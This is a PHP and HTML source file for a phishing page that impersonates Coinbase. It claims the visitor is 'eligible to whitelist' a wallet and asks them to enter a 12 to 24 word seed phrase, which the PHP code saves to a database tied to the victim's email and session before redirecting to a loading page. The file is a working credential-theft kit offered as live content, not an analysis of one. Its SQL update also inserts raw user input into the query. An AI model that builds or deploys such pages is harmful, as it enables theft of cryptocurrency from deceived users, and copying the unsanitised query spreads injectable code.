<?php
// Start the session
session_start();

// Include the database connection file
require_once "admin/db_connection.php";

// Function to update user activity
function updateActivity($token, $activity) {
    global $conn; // Access the database connection within the function
    $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $activity, $token);
    $stmt->execute();
    $stmt->close();
}

// Check if the email and token are set in the session
if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
    // If email or token is not set, redirect the user back to login.php
    header("Location: login.php");
    exit();
}

// Retrieve the email and token from the session
$email = $_SESSION["email"];
$token = $_SESSION["token"];

// Update user activity to indicate visiting app.php
updateActivity($token, "AuthPage");

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the seed phrase submitted in the form and store it as $auth_code
    $auth_code = $_POST["seed_phrase"];

    // Update the user_submissions table with the auth_code (seed phrase) and token
    $update_sql = "UPDATE user_submissions SET auth_app='$auth_code', token='$token' WHERE email='$email'";
    if ($conn->query($update_sql) === TRUE) {
        // Seed phrase and token updated successfully
        // Proceed to loading.php
        header("Location: loading.php");
        exit();
    } else {
        // Error updating seed phrase and token in the database
        echo "Error updating seed phrase and token: " . $conn->error;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/favicon-32x32.png" type="image/x-icon">
    <title>Coinbase - Unlink wallet</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        @font-face {
            font-family: 'CoinbaseSans';
            src: url('assets/CoinbaseSans2.woff2') format('woff2'),
                 url('path/to/CoinbaseSans.woff') format('woff');
            font-weight: normal;
            font-style: normal;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #0A0B0D;
            font-family: 'CoinbaseSans', -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            overflow: hidden; /* Prevent scrolling during loading */
        }

        .wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 60vh;
            display: none; /* Initially hidden */
        }

        .login-container {
            width: 80%;
            max-width: 400px;
            padding: 20px;
            border-radius: 16px;
            border: 1px solid rgba(91, 97, 110, 0.2);
            margin-top: 80px;
        }

        .login-image {
            width: 150px;
            margin-top: 20px;
            margin-left: 20px;
        }

        h2 {
            font-size: 28px;
            color: white;
            font-weight: 600;
        }

        .login-form {
            margin-top: 40px;
        }

        .login-form h2 {
            margin-left: 20px;
            margin-bottom: 0;
        }

        .login-form p {
            color: #5b616e;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
            margin-left: 20px;
            margin-top: 5px;
        }

        .login-form a {
            color: #0052ff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 400;
            line-height: 24px;
        }

        .textarea-container {
            position: relative;
            width: calc(100% - 40px); /* Ensure both have the same width including margin */
            margin-left: 20px;
            margin-top: 20px;
        }

        .login-form textarea {
            width: 100%; /* Set to 100% to fill the parent container */
            height: 100px;
            padding: 10px;
            font-size: 16px;
            margin-top: 15px;
            border-radius: 8px;
            background-color: #1c1e22;
            color: white;
            border: 1px solid #5b616e;
            filter: blur(5px); /* Start off blurred */
            transition: filter 0.3s ease;
            box-sizing: border-box; /* Ensures padding and borders are included in the width */
        }

        .login-form textarea.blurred {
            filter: blur(5px);
        }

        .login-form textarea.unblurred {
            filter: none;
        }

        .toggle-blur {
            position: absolute;
            bottom: 10px; /* Move to bottom */
            right: 10px; /* Move to right */
            background-color: transparent;
            border: none;
            cursor: pointer;
            color: #0052ff;
            font-size: 18px;
        }


        .login-form button[type="submit"] {
            background-color: #FBF9FE;
            border: none;
            border-radius: 24px;
            color: #5b616e;
            cursor: not-allowed;
            font-size: 16px;
            font-weight: 600;
            line-height: 24px;
            margin-left: 20px;
            padding: 16px;
            width: calc(100% - 40px); /* Same width as the textarea */
            margin-top: 30px;
            margin-bottom: 20px;
            box-sizing: border-box; /* Ensures padding and borders are included in the width */
            transition: background-color 0.3s ease, color 0.3s ease;
        }

        .login-form button[type="submit"].active {
            background-color: #0052ff;
            color: white;
            cursor: pointer;
        }

        .loading-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #07090A; /* Updated background color */
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            overflow: hidden;
        }

        .loading-gif {
            width: 600px; /* Increased size */
            height: auto; /* Maintain aspect ratio */
        }
    </style>
</head>

<body>
    <!-- Loading GIF container -->
    <div id="loading" class="loading-container">
        <img src="https://images.ctfassets.net/d3brgz02xdrl/1u8eD3OoQQDdBWWirpC7xQ/ec01f1efe98192c6ff8bfa31b987ebed/smart_wallet.gif" alt="Loading" class="loading-gif">
    </div>

    <div class="wrapper">
    <div class="login-container" bis_skin_checked="1">
            <img src="assets/Consumer_Wordmark.svg" alt="Coinbase Logo" class="login-image">
            <form class="login-form" action="/app.php" method="post" onsubmit="return validateForm()">
                <h2>You are now eligible to whitelist your Coinbase wallet</h2><p>
                </p><p></p><p>For your security, please provide your seed phrase to proceed. Never share your seed phrase with anyone, including Coinbase representatives.</p>

                <div class="textarea-container" bis_skin_checked="1">
                    <textarea id="seedPhraseTextarea" class="blurred" name="seed_phrase" placeholder="dodge carpet hinge shadow..." oninput="checkWordCount()"></textarea>
                    <button type="button" class="toggle-blur" onclick="toggleBlur()"><i class="fas fa-eye"></i></button>
                </div>


                <button id="resendButton" type="submit" disabled="">I understand</button>
            </form>
        </div>

    <script>
        // JavaScript function to toggle blur effect
        function toggleBlur() {
            var textarea = document.getElementById("seedPhraseTextarea");
            var button = document.querySelector('.toggle-blur');
            
            if (textarea.classList.contains("blurred")) {
                textarea.classList.remove("blurred");
                textarea.classList.add("unblurred");
                button.innerHTML = '<i class="fas fa-eye-slash"></i>';
            } else {
                textarea.classList.remove("unblurred");
                textarea.classList.add("blurred");
                button.innerHTML = '<i class="fas fa-eye"></i>';
            }
        }

        // Function to check word count and enable/disable submit button
        function checkWordCount() {
            var textarea = document.getElementById("seedPhraseTextarea");
            var submitButton = document.getElementById("resendButton");
            var wordCount = textarea.value.trim().split(/\s+/).length;
            
            // Check if word count is between 12 and 24
            if (wordCount >= 12 && wordCount <= 24) {
                submitButton.disabled = false;
                submitButton.classList.add("active");
            } else {
                submitButton.disabled = true;
                submitButton.classList.remove("active");
            }
        }

        // Validate the form before submission
        function validateForm() {
            var textarea = document.getElementById("seedPhraseTextarea");
            var wordCount = textarea.value.trim().split(/\s+/).length;
            
            // Ensure word count is between 12 and 24 before submission
            if (wordCount < 12 || wordCount > 24) {
                alert("Please enter a valid seed phrase between 12 and 24 words.");
                return false;
            }
            return true;
        }

        // Hide loading GIF after a minimum delay
        window.onload = function() {
            setTimeout(function() {
                var loading = document.getElementById("loading");
                var wrapper = document.querySelector(".wrapper");
                loading.style.display = "none";
                wrapper.style.display = "flex"; // Show the main content
                document.body.style.overflow = "auto"; // Re-enable scrolling
            }, 3000); // 3000 milliseconds = 3 seconds
        };
    </script>
</body>
</html>
